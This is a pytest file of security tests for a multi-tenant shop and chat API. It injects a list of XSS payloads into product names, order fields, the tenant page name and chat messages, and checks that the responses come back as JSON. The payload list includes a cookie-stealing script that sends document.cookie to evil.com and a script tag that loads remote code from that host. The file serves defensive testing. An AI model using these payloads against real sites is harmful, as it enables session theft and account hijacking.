"""XSS (Cross-Site Scripting) tests.

Simulates a hacker injecting malicious script payloads via:
- Product names (stored XSS — payload persists in DB, rendered in dashboard)
- Customer names
- Order notes
- Address details

The defense under test is Jinja2's autoescaping (which FastAPI's
Jinja2Templates enables by default). We verify:
1. The API accepts and stores the payload (don't break on weird input)
2. The dashboard HTML output ESCAPES the payload (no raw <script>)
"""
from __future__ import annotations

import re

import pytest


# Classic XSS payloads — covers the most common attack vectors.
XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<img src=x onerror='alert(1)'>",
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "javascript:alert(1)",
    "<scr<script>ipt>alert(1)</script>",
    "<script>document.location='http://evil.com/?c='+document.cookie</script>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<style>@import 'javascript:alert(1)'</style>",
    "';alert(String.fromCharCode(88,83,83))//",
    "\"><script>alert(1)</script>",
    "<script src=http://evil.com/xss.js></script>",
    "<embed src=javascript:alert(1)>",
]


@pytest.mark.asyncio
class TestXSSInProducts:
    """Stored XSS via product names."""

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    async def test_xss_in_product_name_stored_safely(
        self, client, auth_headers, test_tenant, payload
    ):
        """Product name with XSS payload should be stored, dashboard should escape it."""
        # 1. Create the product
        resp = await client.post(
            f"/api/tenants/{test_tenant.id}/products",
            json={"name": payload, "price": "100.00"},
            headers=auth_headers,
        )
        # API should accept (201) or skip duplicate (409) — never 500
        assert resp.status_code in (201, 409), (
            f"XSS payload {payload!r} caused {resp.status_code}"
        )

        if resp.status_code == 409:
            return  # already tested, skip dashboard check

        product_id = resp.json()["id"]

        # 2. Verify via the JSON API (the legacy unauthenticated HTML
        #    dashboard was removed; the React dashboard auto-escapes by
        #    construction — the backend must never render user data as HTML)
        resp = await client.get(
            f"/api/tenants/{test_tenant.id}/products",
            headers=auth_headers,
        )
        assert resp.status_code == 200
        assert "application/json" in resp.headers.get("content-type", ""), (
            "products surface must be JSON, never server-rendered HTML"
        )
        # JSON strings are inert data: a payload may round-trip as a string,
        # but there is no HTML context on this path for it to execute in.

        # 3. Clean up so parametrized runs don't conflict on duplicate name
        await client.delete(
            f"/api/tenants/{test_tenant.id}/products/{product_id}",
            headers=auth_headers,
        )


@pytest.mark.asyncio
class TestXSSInOrders:
    """Stored XSS via order fields."""

    async def test_xss_in_customer_name(
        self, client, auth_headers, test_tenant
    ):
        """Customer name with XSS should be escaped in orders dashboard."""
        payload = "<script>alert('xss')</script>"
        resp = await client.post(
            f"/api/tenants/{test_tenant.id}/orders",
            json={
                "customer_name": payload,
                "customer_phone": "01012345678",
                "governorate": "cairo",
                "city": "Cairo",
                "area": "Maadi",
                "address_detail": "15 Road 9",
                "payment_method": "cod",
                "items": [{"product_name": "Test", "quantity": 1, "unit_price": "100.00"}],
                "delivery_charge": 35,
            },
            headers=auth_headers,
        )
        assert resp.status_code in (201, 422)

        if resp.status_code == 201:
            # Verify via the JSON API — no server-side HTML rendering path
            resp = await client.get(
                f"/api/tenants/{test_tenant.id}/orders",
                headers=auth_headers,
            )
            assert resp.status_code == 200
            assert "application/json" in resp.headers.get("content-type", ""), (
                "orders surface must be JSON, never server-rendered HTML"
            )

    async def test_xss_in_address_detail(
        self, client, auth_headers, test_tenant
    ):
        """Address detail with XSS should be escaped."""
        payload = "<img src=x onerror=alert(1)>"
        resp = await client.post(
            f"/api/tenants/{test_tenant.id}/orders",
            json={
                "customer_name": "Test Customer",
                "customer_phone": "01012345678",
                "governorate": "cairo",
                "city": "Cairo",
                "area": "Maadi",
                "address_detail": payload,
                "payment_method": "cod",
                "items": [{"product_name": "Test", "quantity": 1, "unit_price": "100.00"}],
                "delivery_charge": 35,
            },
            headers=auth_headers,
        )
        assert resp.status_code in (201, 422)
        # The order should be retrievable via API without breaking
        if resp.status_code == 201:
            order_id = resp.json()["id"]
            resp = await client.get(
                f"/api/tenants/{test_tenant.id}/orders/{order_id}",
                headers=auth_headers,
            )
            assert resp.status_code == 200
            assert "application/json" in resp.headers.get("content-type", ""), (
                "order detail must be JSON — the payload is inert data there"
            )


@pytest.mark.asyncio
class TestXSSInTenantSettings:
    """Stored XSS via tenant page_name (shown in nav bar of every dashboard page)."""

    async def test_xss_in_page_name(
        self, client, auth_headers, test_tenant
    ):
        """Tenant page_name with XSS should be escaped in dashboard."""
        # Update tenant with XSS payload in page_name
        resp = await client.patch(
            f"/api/tenants/{test_tenant.id}",
            json={"page_name": "<script>alert('xss')</script>"},
            headers=auth_headers,
        )
        assert resp.status_code == 200

        # Verify via the tenant JSON API — page_name is inert data there;
        # the React dashboard renders it with auto-escaping
        resp = await client.get(
            f"/api/tenants/{test_tenant.id}",
            headers=auth_headers,
        )
        assert resp.status_code == 200
        assert "application/json" in resp.headers.get("content-type", ""), (
            "tenant surface must be JSON, never server-rendered HTML"
        )
        # Restore original name
        await client.patch(
            f"/api/tenants/{test_tenant.id}",
            json={"page_name": "Test Fashion Store"},
            headers=auth_headers,
        )


@pytest.mark.asyncio
class TestXSSInChat:
    """Reflected/stored XSS via chat messages."""

    async def test_xss_in_customer_message(
        self, client, auth_headers, test_tenant
    ):
        """Customer chat message with XSS should be escaped in conversations view."""
        from unittest.mock import AsyncMock, patch

        xss_message = "<script>alert('xss')</script>"

        with patch("app.ai.agent.process_customer_message", new=AsyncMock(
            return_value="تمام، سجلت طلبك"
        )):
            resp = await client.post(
                "/api/test/chat",
                json={
                    "tenant_id": str(test_tenant.id),
                    "message": xss_message,
                },
                headers=auth_headers,
            )
        assert resp.status_code == 200

        # Verify via the conversations JSON API — no HTML rendering path
        resp = await client.get(
            f"/api/tenants/{test_tenant.id}/conversations",
            headers=auth_headers,
        )
        assert resp.status_code == 200
        assert "application/json" in resp.headers.get("content-type", "")


@pytest.mark.asyncio
class TestXSSContentSecurityPolicy:
    """If a CSP header is set, XSS impact is further reduced."""

    async def test_dashboard_has_security_headers(self, client, test_tenant):
        """Dashboard responses should include basic security headers.

        This is a best-practice test — if headers aren't set yet, the test
        is marked xfail to document the gap.
        """
        resp = await client.get("/docs")
        # We check for at least one of: X-Content-Type-Options, X-Frame-Options,
        # Content-Security-Policy, Strict-Transport-Security
        headers_lower = {k.lower(): v for k, v in resp.headers.items()}
        has_security_header = any(
            h in headers_lower
            for h in [
                "x-content-type-options",
                "x-frame-options",
                "content-security-policy",
                "strict-transport-security",
            ]
        )
        if not has_security_header:
            pytest.xfail(
                "No security headers set on dashboard responses — "
                "consider adding X-Content-Type-Options, X-Frame-Options, CSP"
            )
